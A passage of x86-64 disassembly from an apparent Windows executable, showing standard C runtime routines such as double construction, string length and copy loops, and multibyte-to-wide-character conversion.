   14000b396:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   14000b39b:	48 c1 e0 20          	shl    $0x20,%rax
   14000b39f:	49 39 cb             	cmp    %rcx,%r11
   14000b3a2:	73 0c                	jae    0x14000b3b0
   14000b3a4:	45 8b 42 f4          	mov    -0xc(%r10),%r8d
   14000b3a8:	89 d9                	mov    %ebx,%ecx
   14000b3aa:	41 d3 e8             	shr    %cl,%r8d
   14000b3ad:	44 09 c2             	or     %r8d,%edx
   14000b3b0:	48 b9 00 00 00 00 ff 	movabs $0xffffffff00000000,%rcx
   14000b3b7:	ff ff ff 
   14000b3ba:	48 21 c8             	and    %rcx,%rax
   14000b3bd:	48 09 d0             	or     %rdx,%rax
   14000b3c0:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000b3c5:	5b                   	pop    %rbx
   14000b3c6:	c3                   	ret
   14000b3c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000b3ce:	00 00 
   14000b3d0:	31 d2                	xor    %edx,%edx
   14000b3d2:	45 85 c0             	test   %r8d,%r8d
   14000b3d5:	75 59                	jne    0x14000b430
   14000b3d7:	44 89 c8             	mov    %r9d,%eax
   14000b3da:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   14000b3df:	48 c1 e0 20          	shl    $0x20,%rax
   14000b3e3:	48 09 d0             	or     %rdx,%rax
   14000b3e6:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000b3eb:	5b                   	pop    %rbx
   14000b3ec:	c3                   	ret
   14000b3ed:	0f 1f 00             	nopl   (%rax)
   14000b3f0:	b9 0b 00 00 00       	mov    $0xb,%ecx
   14000b3f5:	44 89 c8             	mov    %r9d,%eax
   14000b3f8:	31 d2                	xor    %edx,%edx
   14000b3fa:	44 29 c1             	sub    %r8d,%ecx
   14000b3fd:	d3 e8                	shr    %cl,%eax
   14000b3ff:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   14000b404:	48 c1 e0 20          	shl    $0x20,%rax
   14000b408:	49 39 db             	cmp    %rbx,%r11
   14000b40b:	73 06                	jae    0x14000b413
   14000b40d:	41 8b 52 f8          	mov    -0x8(%r10),%edx
   14000b411:	d3 ea                	shr    %cl,%edx
   14000b413:	41 8d 48 15          	lea    0x15(%r8),%ecx
   14000b417:	41 d3 e1             	shl    %cl,%r9d
   14000b41a:	41 09 d1             	or     %edx,%r9d
   14000b41d:	4c 09 c8             	or     %r9,%rax
   14000b420:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000b425:	5b                   	pop    %rbx
   14000b426:	c3                   	ret
   14000b427:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000b42e:	00 00 
   14000b430:	44 89 c8             	mov    %r9d,%eax
   14000b433:	44 89 c1             	mov    %r8d,%ecx
   14000b436:	31 d2                	xor    %edx,%edx
   14000b438:	d3 e0                	shl    %cl,%eax
   14000b43a:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   14000b43f:	48 c1 e0 20          	shl    $0x20,%rax
   14000b443:	e9 68 ff ff ff       	jmp    0x14000b3b0
   14000b448:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b44f:	00 
   14000b450:	57                   	push   %rdi
   14000b451:	56                   	push   %rsi
   14000b452:	53                   	push   %rbx
   14000b453:	48 83 ec 20          	sub    $0x20,%rsp
   14000b457:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b45c:	66 48 0f 7e c3       	movq   %xmm0,%rbx
   14000b461:	48 89 d7             	mov    %rdx,%rdi
   14000b464:	4c 89 c6             	mov    %r8,%rsi
   14000b467:	e8 04 f7 ff ff       	call   0x14000ab70
   14000b46c:	48 85 c0             	test   %rax,%rax
   14000b46f:	0f 84 89 00 00 00    	je     0x14000b4fe
   14000b475:	48 89 da             	mov    %rbx,%rdx
   14000b478:	49 89 da             	mov    %rbx,%r10
   14000b47b:	48 c1 ea 20          	shr    $0x20,%rdx
   14000b47f:	41 89 d1             	mov    %edx,%r9d
   14000b482:	c1 ea 14             	shr    $0x14,%edx
   14000b485:	41 81 e1 ff ff 0f 00 	and    $0xfffff,%r9d
   14000b48c:	44 89 c9             	mov    %r9d,%ecx
   14000b48f:	81 c9 00 00 10 00    	or     $0x100000,%ecx
   14000b495:	81 e2 ff 07 00 00    	and    $0x7ff,%edx
   14000b49b:	44 0f 45 c9          	cmovne %ecx,%r9d
   14000b49f:	85 db                	test   %ebx,%ebx
   14000b4a1:	74 6d                	je     0x14000b510
   14000b4a3:	44 0f bc db          	bsf    %ebx,%r11d
   14000b4a7:	44 89 d9             	mov    %r11d,%ecx
   14000b4aa:	41 d3 ea             	shr    %cl,%r10d
   14000b4ad:	45 85 db             	test   %r11d,%r11d
   14000b4b0:	74 16                	je     0x14000b4c8
   14000b4b2:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000b4b7:	44 89 cb             	mov    %r9d,%ebx
   14000b4ba:	44 29 d9             	sub    %r11d,%ecx
   14000b4bd:	d3 e3                	shl    %cl,%ebx
   14000b4bf:	44 89 d9             	mov    %r11d,%ecx
   14000b4c2:	41 09 da             	or     %ebx,%r10d
   14000b4c5:	41 d3 e9             	shr    %cl,%r9d
   14000b4c8:	31 c9                	xor    %ecx,%ecx
   14000b4ca:	45 85 c9             	test   %r9d,%r9d
   14000b4cd:	44 89 50 18          	mov    %r10d,0x18(%rax)
   14000b4d1:	0f 95 c1             	setne  %cl
   14000b4d4:	44 89 48 1c          	mov    %r9d,0x1c(%rax)
   14000b4d8:	83 c1 01             	add    $0x1,%ecx
   14000b4db:	85 d2                	test   %edx,%edx
   14000b4dd:	89 48 14             	mov    %ecx,0x14(%rax)
   14000b4e0:	75 4d                	jne    0x14000b52f
   14000b4e2:	48 63 d1             	movslq %ecx,%rdx
   14000b4e5:	c1 e1 05             	shl    $0x5,%ecx
   14000b4e8:	41 81 eb 32 04 00 00 	sub    $0x432,%r11d
   14000b4ef:	0f bd 54 90 14       	bsr    0x14(%rax,%rdx,4),%edx
   14000b4f4:	44 89 1f             	mov    %r11d,(%rdi)
   14000b4f7:	83 f2 1f             	xor    $0x1f,%edx
   14000b4fa:	29 d1                	sub    %edx,%ecx
   14000b4fc:	89 0e                	mov    %ecx,(%rsi)
   14000b4fe:	48 83 c4 20          	add    $0x20,%rsp
   14000b502:	5b                   	pop    %rbx
   14000b503:	5e                   	pop    %rsi
   14000b504:	5f                   	pop    %rdi
   14000b505:	c3                   	ret
   14000b506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000b50d:	00 00 00 
   14000b510:	41 0f bc c9          	bsf    %r9d,%ecx
   14000b514:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   14000b51b:	44 8d 59 20          	lea    0x20(%rcx),%r11d
   14000b51f:	41 d3 e9             	shr    %cl,%r9d
   14000b522:	85 d2                	test   %edx,%edx
   14000b524:	44 89 48 18          	mov    %r9d,0x18(%rax)
   14000b528:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b52d:	74 b3                	je     0x14000b4e2
   14000b52f:	42 8d 94 1a cd fb ff 	lea    -0x433(%rdx,%r11,1),%edx
   14000b536:	ff 
   14000b537:	89 17                	mov    %edx,(%rdi)
   14000b539:	ba 35 00 00 00       	mov    $0x35,%edx
   14000b53e:	44 29 da             	sub    %r11d,%edx
   14000b541:	89 16                	mov    %edx,(%rsi)
   14000b543:	48 83 c4 20          	add    $0x20,%rsp
   14000b547:	5b                   	pop    %rbx
   14000b548:	5e                   	pop    %rsi
   14000b549:	5f                   	pop    %rdi
   14000b54a:	c3                   	ret
   14000b54b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b550:	48 89 c8             	mov    %rcx,%rax
   14000b553:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   14000b557:	0f b6 12             	movzbl (%rdx),%edx
   14000b55a:	84 d2                	test   %dl,%dl
   14000b55c:	88 10                	mov    %dl,(%rax)
   14000b55e:	74 12                	je     0x14000b572
   14000b560:	48 83 c1 01          	add    $0x1,%rcx
   14000b564:	0f b6 51 ff          	movzbl -0x1(%rcx),%edx
   14000b568:	48 83 c0 01          	add    $0x1,%rax
   14000b56c:	84 d2                	test   %dl,%dl
   14000b56e:	88 10                	mov    %dl,(%rax)
   14000b570:	75 ee                	jne    0x14000b560
   14000b572:	c3                   	ret
   14000b573:	90                   	nop
   14000b574:	90                   	nop
   14000b575:	90                   	nop
   14000b576:	90                   	nop
   14000b577:	90                   	nop
   14000b578:	90                   	nop
   14000b579:	90                   	nop
   14000b57a:	90                   	nop
   14000b57b:	90                   	nop
   14000b57c:	90                   	nop
   14000b57d:	90                   	nop
   14000b57e:	90                   	nop
   14000b57f:	90                   	nop
   14000b580:	48 85 d2             	test   %rdx,%rdx
   14000b583:	74 2b                	je     0x14000b5b0
   14000b585:	80 39 00             	cmpb   $0x0,(%rcx)
   14000b588:	74 26                	je     0x14000b5b0
   14000b58a:	49 89 c8             	mov    %rcx,%r8
   14000b58d:	eb 07                	jmp    0x14000b596
   14000b58f:	90                   	nop
   14000b590:	41 80 38 00          	cmpb   $0x0,(%r8)
   14000b594:	74 0f                	je     0x14000b5a5
   14000b596:	49 83 c0 01          	add    $0x1,%r8
   14000b59a:	4c 89 c0             	mov    %r8,%rax
   14000b59d:	48 29 c8             	sub    %rcx,%rax
   14000b5a0:	48 39 d0             	cmp    %rdx,%rax
   14000b5a3:	72 eb                	jb     0x14000b590
   14000b5a5:	c3                   	ret
   14000b5a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000b5ad:	00 00 00 
   14000b5b0:	31 c0                	xor    %eax,%eax
   14000b5b2:	c3                   	ret
   14000b5b3:	90                   	nop
   14000b5b4:	90                   	nop
   14000b5b5:	90                   	nop
   14000b5b6:	90                   	nop
   14000b5b7:	90                   	nop
   14000b5b8:	90                   	nop
   14000b5b9:	90                   	nop
   14000b5ba:	90                   	nop
   14000b5bb:	90                   	nop
   14000b5bc:	90                   	nop
   14000b5bd:	90                   	nop
   14000b5be:	90                   	nop
   14000b5bf:	90                   	nop
   14000b5c0:	31 c0                	xor    %eax,%eax
   14000b5c2:	48 85 d2             	test   %rdx,%rdx
   14000b5c5:	74 19                	je     0x14000b5e0
   14000b5c7:	66 83 39 00          	cmpw   $0x0,(%rcx)
   14000b5cb:	75 0a                	jne    0x14000b5d7
   14000b5cd:	eb 11                	jmp    0x14000b5e0
   14000b5cf:	90                   	nop
   14000b5d0:	66 83 3c 41 00       	cmpw   $0x0,(%rcx,%rax,2)
   14000b5d5:	74 09                	je     0x14000b5e0
   14000b5d7:	48 83 c0 01          	add    $0x1,%rax
   14000b5db:	48 39 c2             	cmp    %rax,%rdx
   14000b5de:	75 f0                	jne    0x14000b5d0
   14000b5e0:	c3                   	ret
   14000b5e1:	90                   	nop
   14000b5e2:	90                   	nop
   14000b5e3:	90                   	nop
   14000b5e4:	90                   	nop
   14000b5e5:	90                   	nop
   14000b5e6:	90                   	nop
   14000b5e7:	90                   	nop
   14000b5e8:	90                   	nop
   14000b5e9:	90                   	nop
   14000b5ea:	90                   	nop
   14000b5eb:	90                   	nop
   14000b5ec:	90                   	nop
   14000b5ed:	90                   	nop
   14000b5ee:	90                   	nop
   14000b5ef:	90                   	nop
   14000b5f0:	48 8b 05 c9 e5 37 00 	mov    0x37e5c9(%rip),%rax        # 0x140389bc0
   14000b5f7:	48 8b 00             	mov    (%rax),%rax
   14000b5fa:	c3                   	ret
   14000b5fb:	90                   	nop
   14000b5fc:	90                   	nop
   14000b5fd:	90                   	nop
   14000b5fe:	90                   	nop
   14000b5ff:	90                   	nop
   14000b600:	48 8b 05 a9 e5 37 00 	mov    0x37e5a9(%rip),%rax        # 0x140389bb0
   14000b607:	48 8b 00             	mov    (%rax),%rax
   14000b60a:	c3                   	ret
   14000b60b:	90                   	nop
   14000b60c:	90                   	nop
   14000b60d:	90                   	nop
   14000b60e:	90                   	nop
   14000b60f:	90                   	nop
   14000b610:	48 8b 05 89 e5 37 00 	mov    0x37e589(%rip),%rax        # 0x140389ba0
   14000b617:	48 8b 00             	mov    (%rax),%rax
   14000b61a:	c3                   	ret
   14000b61b:	90                   	nop
   14000b61c:	90                   	nop
   14000b61d:	90                   	nop
   14000b61e:	90                   	nop
   14000b61f:	90                   	nop
   14000b620:	48 8b 05 b9 15 38 00 	mov    0x3815b9(%rip),%rax        # 0x14038cbe0
   14000b627:	c3                   	ret
   14000b628:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b62f:	00 
   14000b630:	48 89 c8             	mov    %rcx,%rax
   14000b633:	48 87 05 a6 15 38 00 	xchg   %rax,0x3815a6(%rip)        # 0x14038cbe0
   14000b63a:	c3                   	ret
   14000b63b:	90                   	nop
   14000b63c:	90                   	nop
   14000b63d:	90                   	nop
   14000b63e:	90                   	nop
   14000b63f:	90                   	nop
   14000b640:	53                   	push   %rbx
   14000b641:	48 83 ec 20          	sub    $0x20,%rsp
   14000b645:	89 cb                	mov    %ecx,%ebx
   14000b647:	e8 cc 03 00 00       	call   0x14000ba18
   14000b64c:	89 d9                	mov    %ebx,%ecx
   14000b64e:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
   14000b652:	48 c1 e2 04          	shl    $0x4,%rdx
   14000b656:	48 01 d0             	add    %rdx,%rax
   14000b659:	48 83 c4 20          	add    $0x20,%rsp
   14000b65d:	5b                   	pop    %rbx
   14000b65e:	c3                   	ret
   14000b65f:	90                   	nop
   14000b660:	48 83 ec 28          	sub    $0x28,%rsp
   14000b664:	48 8b 05 85 15 38 00 	mov    0x381585(%rip),%rax        # 0x14038cbf0
   14000b66b:	48 85 c0             	test   %rax,%rax
   14000b66e:	74 09                	je     0x14000b679
   14000b670:	45 31 c0             	xor    %r8d,%r8d
   14000b673:	31 d2                	xor    %edx,%edx
   14000b675:	31 c9                	xor    %ecx,%ecx
   14000b677:	ff d0                	call   *%rax
   14000b679:	48 c7 05 6c 15 38 00 	movq   $0x0,0x38156c(%rip)        # 0x14038cbf0
   14000b680:	00 00 00 00 
   14000b684:	48 83 c4 28          	add    $0x28,%rsp
   14000b688:	c3                   	ret
   14000b689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000b690:	48 89 0d 59 15 38 00 	mov    %rcx,0x381559(%rip)        # 0x14038cbf0
   14000b697:	48 8d 0d c2 ff ff ff 	lea    -0x3e(%rip),%rcx        # 0x14000b660
   14000b69e:	e9 7d 5e ff ff       	jmp    0x140001520
   14000b6a3:	90                   	nop
   14000b6a4:	90                   	nop
   14000b6a5:	90                   	nop
   14000b6a6:	90                   	nop
   14000b6a7:	90                   	nop
   14000b6a8:	90                   	nop
   14000b6a9:	90                   	nop
   14000b6aa:	90                   	nop
   14000b6ab:	90                   	nop
   14000b6ac:	90                   	nop
   14000b6ad:	90                   	nop
   14000b6ae:	90                   	nop
   14000b6af:	90                   	nop
   14000b6b0:	56                   	push   %rsi
   14000b6b1:	53                   	push   %rbx
   14000b6b2:	48 83 ec 48          	sub    $0x48,%rsp
   14000b6b6:	48 85 d2             	test   %rdx,%rdx
   14000b6b9:	48 89 ce             	mov    %rcx,%rsi
   14000b6bc:	48 89 d3             	mov    %rdx,%rbx
   14000b6bf:	0f 84 1e 01 00 00    	je     0x14000b7e3
   14000b6c5:	4d 85 c0             	test   %r8,%r8
   14000b6c8:	0f 84 1e 01 00 00    	je     0x14000b7ec
   14000b6ce:	0f b6 12             	movzbl (%rdx),%edx
   14000b6d1:	41 8b 01             	mov    (%r9),%eax
   14000b6d4:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
   14000b6db:	84 d2                	test   %dl,%dl
   14000b6dd:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   14000b6e1:	0f 84 9a 00 00 00    	je     0x14000b781
   14000b6e7:	83 bc 24 88 00 00 00 	cmpl   $0x1,0x88(%rsp)
   14000b6ee:	01 
   14000b6ef:	76 73                	jbe    0x14000b764
   14000b6f1:	84 c0                	test   %al,%al
   14000b6f3:	0f 85 97 00 00 00    	jne    0x14000b790
   14000b6f9:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
   14000b6fe:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   14000b705:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
   14000b70a:	ff 15 6c 1b 38 00    	call   *0x381b6c(%rip)        # 0x14038d27c
   14000b710:	85 c0                	test   %eax,%eax
   14000b712:	74 50                	je     0x14000b764
   14000b714:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   14000b719:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   14000b71e:	49 83 f8 01          	cmp    $0x1,%r8
   14000b722:	0f 86 dd 00 00 00    	jbe    0x14000b805
   14000b728:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000b72d:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000b733:	49 89 d8             	mov    %rbx,%r8
   14000b736:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000b73d:	00 
   14000b73e:	ba 08 00 00 00       	mov    $0x8,%edx
   14000b743:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   14000b74a:	ff 15 3c 1b 38 00    	call   *0x381b3c(%rip)        # 0x14038d28c
   14000b750:	85 c0                	test   %eax,%eax
   14000b752:	0f 84 9b 00 00 00    	je     0x14000b7f3
   14000b758:	b8 02 00 00 00       	mov    $0x2,%eax
   14000b75d:	48 83 c4 48          	add    $0x48,%rsp
   14000b761:	5b                   	pop    %rbx
   14000b762:	5e                   	pop    %rsi
   14000b763:	c3                   	ret
   14000b764:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   14000b76b:	85 c0                	test   %eax,%eax
   14000b76d:	75 41                	jne    0x14000b7b0
   14000b76f:	0f b6 03             	movzbl (%rbx),%eax
   14000b772:	66 89 06             	mov    %ax,(%rsi)
   14000b775:	b8 01 00 00 00       	mov    $0x1,%eax
   14000b77a:	48 83 c4 48          	add    $0x48,%rsp
   14000b77e:	5b                   	pop    %rbx
   14000b77f:	5e                   	pop    %rsi
   14000b780:	c3                   	ret
   14000b781:	31 d2                	xor    %edx,%edx
   14000b783:	31 c0                	xor    %eax,%eax
   14000b785:	66 89 11             	mov    %dx,(%rcx)
   14000b788:	48 83 c4 48          	add    $0x48,%rsp
   14000b78c:	5b                   	pop    %rbx
   14000b78d:	5e                   	pop    %rsi
   14000b78e:	c3                   	ret
   14000b78f:	90                   	nop
   14000b790:	88 54 24 3d          	mov    %dl,0x3d(%rsp)
   14000b794:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000b79a:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000b7a1:	00 
   14000b7a2:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   14000b7a7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000b7ac:	eb 90                	jmp    0x14000b73e
   14000b7ae:	66 90                	xchg   %ax,%ax
   14000b7b0:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000b7b7:	00 
   14000b7b8:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000b7be:	49 89 d8             	mov    %rbx,%r8
   14000b7c1:	ba 08 00 00 00       	mov    $0x8,%edx
   14000b7c6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000b7cb:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   14000b7d2:	ff 15 b4 1a 38 00    	call   *0x381ab4(%rip)        # 0x14038d28c
   14000b7d8:	85 c0                	test   %eax,%eax
   14000b7da:	74 17                	je     0x14000b7f3
   14000b7dc:	b8 01 00 00 00       	mov    $0x1,%eax
   14000b7e1:	eb a5                	jmp    0x14000b788
   14000b7e3:	31 c0                	xor    %eax,%eax
   14000b7e5:	48 83 c4 48          	add    $0x48,%rsp
   14000b7e9:	5b                   	pop    %rbx
   14000b7ea:	5e                   	pop    %rsi
   14000b7eb:	c3                   	ret
   14000b7ec:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
   14000b7f1:	eb 95                	jmp    0x14000b788
   14000b7f3:	e8 58 02 00 00       	call   0x14000ba50
   14000b7f8:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b7fe:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000b803:	eb 83                	jmp    0x14000b788
   14000b805:	0f b6 03             	movzbl (%rbx),%eax
   14000b808:	41 88 01             	mov    %al,(%r9)
   14000b80b:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
   14000b810:	e9 73 ff ff ff       	jmp    0x14000b788
   14000b815:	90                   	nop
   14000b816:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000b81d:	00 00 00 
   14000b820:	41 54                	push   %r12
   14000b822:	55                   	push   %rbp
   14000b823:	57                   	push   %rdi
   14000b824:	56                   	push   %rsi
   14000b825:	53                   	push   %rbx
   14000b826:	48 83 ec 40          	sub    $0x40,%rsp
   14000b82a:	31 c0                	xor    %eax,%eax
   14000b82c:	48 89 cb             	mov    %rcx,%rbx
   14000b82f:	48 85 c9             	test   %rcx,%rcx
   14000b832:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   14000b837:	4c 89 ce             	mov    %r9,%rsi
   14000b83a:	48 8d 44 24 3e       	lea    0x3e(%rsp),%rax
   14000b83f:	48 89 d7             	mov    %rdx,%rdi
   14000b842:	4c 89 c5             	mov    %r8,%rbp
   14000b845:	48 0f 44 d8          	cmove  %rax,%rbx
   14000b849:	e8 c2 01 00 00       	call   0x14000ba10
   14000b84e:	41 89 c4             	mov    %eax,%r12d
   14000b851:	e8 b2 01 00 00       	call   0x14000ba08
   14000b856:	48 85 f6             	test   %rsi,%rsi
   14000b859:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000b85e:	49 89 e8             	mov    %rbp,%r8
   14000b861:	4c 8d 0d a0 13 38 00 	lea    0x3813a0(%rip),%r9        # 0x14038cc08
   14000b868:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000b86c:	48 89 fa             	mov    %rdi,%rdx
   14000b86f:	48 89 d9             	mov    %rbx,%rcx
   14000b872:	4c 0f 45 ce          	cmovne %rsi,%r9
   14000b876:	e8 35 fe ff ff       	call   0x14000b6b0
   14000b87b:	48 98                	cltq
   14000b87d:	48 83 c4 40          	add    $0x40,%rsp
   14000b881:	5b                   	pop    %rbx
   14000b882:	5e                   	pop    %rsi
   14000b883:	5f                   	pop    %rdi
   14000b884:	5d                   	pop    %rbp
   14000b885:	41 5c                	pop    %r12
   14000b887:	c3                   	ret
   14000b888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b88f:	00 
   14000b890:	41 56                	push   %r14
   14000b892:	41 55                	push   %r13
   14000b894:	41 54                	push   %r12
   14000b896:	55                   	push   %rbp
   14000b897:	57                   	push   %rdi
   14000b898:	56                   	push   %rsi
   14000b899:	53                   	push   %rbx
   14000b89a:	48 83 ec 40          	sub    $0x40,%rsp
   14000b89e:	48 8d 05 5f 13 38 00 	lea    0x38135f(%rip),%rax        # 0x14038cc04
   14000b8a5:	4d 85 c9             	test   %r9,%r9
   14000b8a8:	4c 89 cf             	mov    %r9,%rdi
   14000b8ab:	48 89 d6             	mov    %rdx,%rsi
   14000b8ae:	48 0f 44 f8          	cmove  %rax,%rdi
   14000b8b2:	49 89 ce             	mov    %rcx,%r14
   14000b8b5:	4c 89 c5             	mov    %r8,%rbp
   14000b8b8:	e8 4b 01 00 00       	call   0x14000ba08
   14000b8bd:	41 89 c5             	mov    %eax,%r13d
   14000b8c0:	e8 4b 01 00 00       	call   0x14000ba10
   14000b8c5:	48 85 f6             	test   %rsi,%rsi
   14000b8c8:	41 89 c4             	mov    %eax,%r12d
   14000b8cb:	0f 84 bf 00 00 00    	je     0x14000b990
   14000b8d1:	48 8b 16             	mov    (%rsi),%rdx
   14000b8d4:	48 85 d2             	test   %rdx,%rdx
   14000b8d7:	0f 84 b3 00 00 00    	je     0x14000b990
   14000b8dd:	4d 85 f6             	test   %r14,%r14
   14000b8e0:	74 6e                	je     0x14000b950
   14000b8e2:	31 db                	xor    %ebx,%ebx
   14000b8e4:	48 85 ed             	test   %rbp,%rbp
   14000b8e7:	75 1e                	jne    0x14000b907
   14000b8e9:	eb 4b                	jmp    0x14000b936
   14000b8eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b8f0:	48 8b 16             	mov    (%rsi),%rdx
   14000b8f3:	48 98                	cltq
   14000b8f5:	49 83 c6 02          	add    $0x2,%r14
   14000b8f9:	48 01 c3             	add    %rax,%rbx
   14000b8fc:	48 01 c2             	add    %rax,%rdx
   14000b8ff:	48 39 dd             	cmp    %rbx,%rbp
   14000b902:	48 89 16             	mov    %rdx,(%rsi)
   14000b905:	76 2f                	jbe    0x14000b936
   14000b907:	49 89 e8             	mov    %rbp,%r8
   14000b90a:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000b90f:	49 89 f9             	mov    %rdi,%r9
   14000b912:	4c 89 f1             	mov    %r14,%rcx
   14000b915:	49 29 d8             	sub    %rbx,%r8
   14000b918:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
   14000b91d:	e8 8e fd ff ff       	call   0x14000b6b0
   14000b922:	85 c0                	test   %eax,%eax
   14000b924:	7f ca                	jg     0x14000b8f0
   14000b926:	48 39 dd             	cmp    %rbx,%rbp
   14000b929:	76 0b                	jbe    0x14000b936
   14000b92b:	85 c0                	test   %eax,%eax
   14000b92d:	75 07                	jne    0x14000b936
   14000b92f:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
   14000b936:	48 89 d8             	mov    %rbx,%rax
   14000b939:	48 83 c4 40          	add    $0x40,%rsp
   14000b93d:	5b                   	pop    %rbx
   14000b93e:	5e                   	pop    %rsi
   14000b93f:	5f                   	pop    %rdi
   14000b940:	5d                   	pop    %rbp
   14000b941:	41 5c                	pop    %r12
   14000b943:	41 5d                	pop    %r13
   14000b945:	41 5e                	pop    %r14
   14000b947:	c3                   	ret
   14000b948:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b94f:	00 
   14000b950:	31 c0                	xor    %eax,%eax
   14000b952:	45 89 e6             	mov    %r12d,%r14d
   14000b955:	31 db                	xor    %ebx,%ebx
   14000b957:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   14000b95c:	48 8d 6c 24 3e       	lea    0x3e(%rsp),%rbp
   14000b961:	eb 08                	jmp    0x14000b96b
   14000b963:	48 8b 16             	mov    (%rsi),%rdx
   14000b966:	48 98                	cltq
   14000b968:	48 01 c3             	add    %rax,%rbx
   14000b96b:	48 01 da             	add    %rbx,%rdx
   14000b96e:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000b973:	49 89 f9             	mov    %rdi,%r9
   14000b976:	4d 89 f0             	mov    %r14,%r8
   14000b979:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
   14000b97e:	48 89 e9             	mov    %rbp,%rcx
   14000b981:	e8 2a fd ff ff       	call   0x14000b6b0
   14000b986:	85 c0                	test   %eax,%eax
   14000b988:	7f d9                	jg     0x14000b963
   14000b98a:	eb aa                	jmp    0x14000b936
   14000b98c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000b990:	31 db                	xor    %ebx,%ebx
   14000b992:	eb a2                	jmp    0x14000b936
   14000b994:	66 90                	xchg   %ax,%ax
   14000b996:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000b99d:	00 00 00 
   14000b9a0:	55                   	push   %rbp
   14000b9a1:	57                   	push   %rdi
   14000b9a2:	56                   	push   %rsi
   14000b9a3:	53                   	push   %rbx
   14000b9a4:	48 83 ec 48          	sub    $0x48,%rsp
   14000b9a8:	31 c0                	xor    %eax,%eax
   14000b9aa:	48 89 ce             	mov    %rcx,%rsi
   14000b9ad:	48 89 d7             	mov    %rdx,%rdi
   14000b9b0:	4c 89 c3             	mov    %r8,%rbx
   14000b9b3:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   14000b9b8:	e8 53 00 00 00       	call   0x14000ba10
   14000b9bd:	89 c5                	mov    %eax,%ebp
   14000b9bf:	e8 44 00 00 00       	call   0x14000ba08
   14000b9c4:	48 85 db             	test   %rbx,%rbx
   14000b9c7:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   14000b9cb:	49 89 f8             	mov    %rdi,%r8
   14000b9ce:	48 8d 15 2b 12 38 00 	lea    0x38122b(%rip),%rdx        # 0x14038cc00
   14000b9d5:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000b9d9:	48 0f 44 da          	cmove  %rdx,%rbx
   14000b9dd:	48 89 f2             	mov    %rsi,%rdx
   14000b9e0:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
   14000b9e5:	49 89 d9             	mov    %rbx,%r9
   14000b9e8:	e8 c3 fc ff ff       	call   0x14000b6b0
   14000b9ed:	48 98                	cltq
   14000b9ef:	48 83 c4 48          	add    $0x48,%rsp
   14000b9f3:	5b                   	pop    %rbx
   14000b9f4:	5e                   	pop    %rsi
   14000b9f5:	5f                   	pop    %rdi
   14000b9f6:	5d                   	pop    %rbp
   14000b9f7:	c3                   	ret
   14000b9f8:	90                   	nop
   14000b9f9:	90                   	nop
   14000b9fa:	90                   	nop
   14000b9fb:	90                   	nop
   14000b9fc:	90                   	nop
   14000b9fd:	90                   	nop
   14000b9fe:	90                   	nop
   14000b9ff:	90                   	nop
